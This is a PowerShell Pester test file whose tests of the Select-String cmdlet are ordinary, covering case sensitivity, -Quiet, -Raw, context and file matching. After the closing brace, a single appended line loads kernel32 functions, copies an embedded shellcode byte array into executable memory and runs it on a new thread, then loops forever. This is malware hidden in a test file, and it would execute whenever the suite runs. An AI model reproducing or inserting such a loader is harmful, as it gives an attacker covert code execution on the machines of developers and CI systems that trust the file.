


Describe "Select-String" -Tags "CI" {
    BeforeAll {
        $nl = [Environment]::NewLine
        $currentDirectory = $pwd.Path
    }

    AfterAll {
        Push-Location $currentDirectory
    }

    Context "String actions" {
        $testinputone = "hello","Hello","goodbye"
        $testinputtwo = "hello","Hello"

        it "Should be called without errors" {
            { $testinputone | Select-String -Pattern "hello" } | Should -Not -Throw
        }

        it "Should return an array data type when multiple matches are found" {
            $result = $testinputtwo | Select-String -Pattern "hello"
            ,$result | Should -BeOfType "System.Array"
        }

        it "Should return an object type when one match is found" {
            $result = $testinputtwo | Select-String -Pattern "hello" -CaseSensitive
            ,$result | Should -BeOfType "System.Object"
        }

        it "Should return matchinfo type" {
            $result = $testinputtwo | Select-String -Pattern "hello" -CaseSensitive
            ,$result | Should -BeOfType "Microsoft.PowerShell.Commands.MatchInfo"
        }

        it "Should be called without an error using ca for casesensitive " {
            {$testinputone | Select-String -Pattern "hello" -ca } | Should -Not -Throw
        }

        it "Should use the ca alias for casesensitive" {
            $firstMatch = $testinputtwo  | Select-String -Pattern "hello" -CaseSensitive
            $secondMatch = $testinputtwo | Select-String -Pattern "hello" -ca

            $equal = @(Compare-Object $firstMatch $secondMatch).Length -eq 0
            $equal | Should -Be True
        }

        it "Should only return the case sensitive match when the casesensitive switch is used" {
            $testinputtwo | Select-String -Pattern "hello" -CaseSensitive | Should -Be "hello"
        }

        it "Should accept a collection of strings from the input object" {
            { Select-String -InputObject "some stuff", "other stuff" -Pattern "other" } | Should -Not -Throw
        }

        it "Should return system.object when the input object switch is used on a collection" {
            $result = Select-String -InputObject "some stuff", "other stuff" -pattern "other"
            ,$result | Should -BeOfType "System.Object"
        }

        it "Should return null or empty when the input object switch is used on a collection and the pattern does not exist" {
            Select-String -InputObject "some stuff", "other stuff" -Pattern "neither" | Should -BeNullOrEmpty
        }

        it "Should return a bool type when the quiet switch is used" {
            ,($testinputtwo | Select-String -Quiet "hello" -CaseSensitive) | Should -BeOfType "System.Boolean"
        }

        it "Should be true when select string returns a positive result when the quiet switch is used" {
            ($testinputtwo | Select-String -Quiet "hello" -CaseSensitive) | Should -BeTrue
        }

        it "Should be empty when select string does not return a result when the quiet switch is used" {
            $testinputtwo | Select-String -Quiet "goodbye"  | Should -BeNullOrEmpty
        }

        it "Should return an array of non matching strings when the switch of NotMatch is used and the string do not match" {
            $testinputone | Select-String -Pattern "goodbye" -NotMatch | Should -BeExactly "hello", "Hello"
        }

        it "Should output a string with the first match highlighted" {
            if ($Host.UI.SupportsVirtualTerminal -and !(Test-Path env:__SuppressAnsiEscapeSequences))
            {
                $result = $testinputone | Select-String -Pattern "l" | Out-String
                $result | Should -Be "${nl}he`e[7ml`e[0mlo${nl}He`e[7ml`e[0mlo${nl}${nl}"
            }
            else
            {
                $result = $testinputone | Select-String -Pattern "l" | Out-String
                $result | Should -Be "${nl}hello${nl}Hello${nl}${nl}"
            }
        }

        it "Should output a string with all matches highlighted when AllMatch is used" {
            if ($Host.UI.SupportsVirtualTerminal -and !(Test-Path env:__SuppressAnsiEscapeSequences))
            {
                $result = $testinputone | Select-String -Pattern "l" -AllMatch | Out-String
                $result | Should -Be "${nl}he`e[7ml`e[0m`e[7ml`e[0mo${nl}He`e[7ml`e[0m`e[7ml`e[0mo${nl}${nl}"
            }
            else
            {
                $result = $testinputone | Select-String -Pattern "l" -AllMatch | Out-String
                $result | Should -Be "${nl}hello${nl}Hello${nl}${nl}"
            }
        }

        it "Should output a string with the first match highlighted when SimpleMatch is used" {
            if ($Host.UI.SupportsVirtualTerminal -and !(Test-Path env:__SuppressAnsiEscapeSequences))
            {
                $result = $testinputone | Select-String -Pattern "l" -SimpleMatch | Out-String
                $result | Should -Be "${nl}he`e[7ml`e[0mlo${nl}He`e[7ml`e[0mlo${nl}${nl}"
            }
            else
            {
                $result = $testinputone | Select-String -Pattern "l" -SimpleMatch | Out-String
                $result | Should -Be "${nl}hello${nl}Hello${nl}${nl}"
            }
        }

        it "Should output a string without highlighting when NoEmphasis is used" {
            $result = $testinputone | Select-String -Pattern "l" -NoEmphasis | Out-String
            $result | Should -Be "${nl}hello${nl}Hello${nl}${nl}"
        }

        it "Should return an array of matching strings without virtual terminal sequences" {
            $testinputone | Select-String -Pattern "l" | Should -Be "hello", "hello"
        }

        It "Should return a string type when -Raw is used" {
            $result = $testinputtwo | Select-String -Pattern "hello" -CaseSensitive -Raw
            $result | Should -BeOfType "System.String"
        }

        It "Should return ParameterBindingException when -Raw and -Quiet are used together" {
            { $testinputone | Select-String -Pattern "hello" -Raw -Quiet -ErrorAction Stop } | Should -Throw -ExceptionType ([System.Management.Automation.ParameterBindingException])
        }
    }

    Context "Filesystem actions" {
        $testDirectory = $TestDrive
        $testInputFile = Join-Path -Path $testDirectory -ChildPath testfile1.txt

        BeforeEach {
            New-Item $testInputFile -Itemtype "file" -Force -Value "This is a text string, and another string${nl}This is the second line${nl}This is the third line${nl}This is the fourth line${nl}No matches"
        }

        AfterEach {
            Remove-Item $testInputFile -Force
        }

        It "Should return an object when a match is found is the file on only one line" {
            $result = Select-String $testInputFile -Pattern "string"
            ,$result | Should -BeOfType "System.Object"
        }

        It "Should return an array when a match is found is the file on several lines" {
            $result = Select-String $testInputFile -Pattern "in"
            ,$result | Should -BeOfType "System.Array"
            $result[0] | Should -BeOfType "Microsoft.PowerShell.Commands.MatchInfo"
        }

        It "Should return the name of the file and the string that 'string' is found if there is only one lines that has a match" {
            $expected = $testInputFile + ":1:This is a text string, and another string"

            Select-String $testInputFile -Pattern "string" | Should -BeExactly $expected
        }

        It "Should return all strings where 'second' is found in testfile1 if there is only one lines that has a match" {
            $expected = $testInputFile + ":2:This is the second line"

            Select-String $testInputFile  -Pattern "second"| Should -BeExactly $expected
        }

        It "Should return all strings where 'in' is found in testfile1 pattern switch is not required" {
            $expected1 = "This is a text string, and another string"
            $expected2 = "This is the second line"
            $expected3 = "This is the third line"
            $expected4 = "This is the fourth line"

            (Select-String in $testInputFile)[0].Line | Should -BeExactly $expected1
            (Select-String in $testInputFile)[1].Line | Should -BeExactly $expected2
            (Select-String in $testInputFile)[2].Line | Should -BeExactly $expected3
            (Select-String in $testInputFile)[3].Line | Should -BeExactly $expected4
            (Select-String in $testInputFile)[4].Line | Should -BeNullOrEmpty
        }

        It "Should return empty because 'for' is not found in testfile1 " {
            Select-String for $testInputFile | Should -BeNullOrEmpty
        }

        It "Should return the third line in testfile1 and the lines above and below it " {
            $expectedLine       = "testfile1.txt:2:This is the second line"
            $expectedLineBefore = "testfile1.txt:3:This is the third line"
            $expectedLineAfter  = "testfile1.txt:4:This is the fourth line"

            Select-String third $testInputFile -Context 1 | Should -Match $expectedLine
            Select-String third $testInputFile -Context 1 | Should -Match $expectedLineBefore
            Select-String third $testInputFile -Context 1 | Should -Match $expectedLineAfter
        }

        It "Should return the number of matches for 'is' in textfile1 " {
            (Select-String is $testInputFile -CaseSensitive).count| Should -Be 4
        }

        It "Should return the third line in testfile1 when a relative path is used" {
            $expected  = "testfile1.txt:3:This is the third line"

            $relativePath = Join-Path -Path $testDirectory -ChildPath ".."
            $relativePath = Join-Path -Path $relativePath -ChildPath $TestDirectory.Name
            $relativePath = Join-Path -Path $relativePath -ChildPath testfile1.txt
            Select-String third $relativePath  | Should -Match $expected
        }

        It "Should return the fourth line in testfile1 when a relative path is used" {
            $expected = "testfile1.txt:5:No matches"

            Push-Location $testDirectory

            Select-String matches (Join-Path -Path $testDirectory -ChildPath testfile1.txt)  | Should -Match $expected
            Pop-Location
        }

        It "Should return the fourth line in testfile1 when a regular expression is used" {
            $expected  = "testfile1.txt:5:No matches"

            Select-String 'matc*' $testInputFile -CaseSensitive | Should -Match $expected
        }

        It "Should return the fourth line in testfile1 when a regular expression is used, using the alias for casesensitive" {
            $expected  = "testfile1.txt:5:No matches"

            Select-String 'matc*' $testInputFile -ca | Should -Match $expected
        }

        It "Should return all strings where 'in' is found in testfile1, when -Raw is used." {
            $expected1 = "This is a text string, and another string"
            $expected2 = "This is the second line"
            $expected3 = "This is the third line"
            $expected4 = "This is the fourth line"

            (Select-String in $testInputFile -Raw)[0] | Should -BeExactly $expected1
            (Select-String in $testInputFile -Raw)[1] | Should -BeExactly $expected2
            (Select-String in $testInputFile -Raw)[2] | Should -BeExactly $expected3
            (Select-String in $testInputFile -Raw)[3] | Should -BeExactly $expected4
            (Select-String in $testInputFile -Raw)[4] | Should -BeNullOrEmpty
        }

        It "Should ignore -Context parameter when -Raw is used." {
            $expected = "This is the second line"
            Select-String second $testInputFile -Raw -Context 2,2 | Should -BeExactly $expected
        }
    }
}

$yQ2B = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yQ2B -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xa4,0x4c,0x9c,0xc4,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x7b,0x13,0x83,0xeb,0xfc,0x03,0x7b,0xab,0xae,0x69,0x38,0x5b,0xac,0x92,0xc1,0x9b,0xd1,0x1b,0x24,0xaa,0xd1,0x78,0x2c,0x9c,0xe1,0x0b,0x60,0x10,0x89,0x5e,0x91,0xa3,0xff,0x76,0x96,0x04,0xb5,0xa0,0x99,0x95,0xe6,0x91,0xb8,0x15,0xf5,0xc5,0x1a,0x24,0x36,0x18,0x5a,0x61,0x2b,0xd1,0x0e,0x3a,0x27,0x44,0xbf,0x4f,0x7d,0x55,0x34,0x03,0x93,0xdd,0xa9,0xd3,0x92,0xcc,0x7f,0x68,0xcd,0xce,0x7e,0xbd,0x65,0x47,0x99,0xa2,0x40,0x11,0x12,0x10,0x3e,0xa0,0xf2,0x69,0xbf,0x0f,0x3b,0x46,0x32,0x51,0x7b,0x60,0xad,0x24,0x75,0x93,0x50,0x3f,0x42,0xee,0x8e,0xca,0x51,0x48,0x44,0x6c,0xbe,0x69,0x89,0xeb,0x35,0x65,0x66,0x7f,0x11,0x69,0x79,0xac,0x29,0x95,0xf2,0x53,0xfe,0x1c,0x40,0x70,0xda,0x45,0x12,0x19,0x7b,0x23,0xf5,0x26,0x9b,0x8c,0xaa,0x82,0xd7,0x20,0xbe,0xbe,0xb5,0x2c,0x73,0xf3,0x45,0xac,0x1b,0x84,0x36,0x9e,0x84,0x3e,0xd1,0x92,0x4d,0x99,0x26,0xd5,0x67,0x5d,0xb8,0x28,0x88,0x9e,0x90,0xee,0xdc,0xce,0x8a,0xc7,0x5c,0x85,0x4a,0xe8,0x88,0x30,0x4e,0x7e,0xf3,0x6d,0x51,0x7b,0x9b,0x6f,0x52,0x82,0xe0,0xf9,0xb4,0xd4,0x46,0xaa,0x68,0x94,0x36,0x0a,0xd9,0x7c,0x5d,0x85,0x06,0x9c,0x5e,0x4f,0x2f,0x36,0xb1,0x26,0x07,0xae,0x28,0x63,0xd3,0x4f,0xb4,0xb9,0x99,0x4f,0x3e,0x4e,0x5d,0x01,0xb7,0x3b,0x4d,0xf5,0x37,0x76,0x2f,0x53,0x47,0xac,0x5a,0x5b,0xdd,0x4b,0xcd,0x0c,0x49,0x56,0x28,0x7a,0xd6,0xa9,0x1f,0xf1,0xdf,0x3f,0xe0,0x6d,0x20,0xd0,0xe0,0x6d,0x76,0xba,0xe0,0x05,0x2e,0x9e,0xb2,0x30,0x31,0x0b,0xa7,0xe9,0xa4,0xb4,0x9e,0x5e,0x6e,0xdd,0x1c,0xb9,0x58,0x42,0xde,0xec,0x58,0xbe,0x09,0xc8,0x2e,0xae,0x89;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$qt8=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($qt8.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$qt8,0,0,0);for (;;){Start-sleep 60};

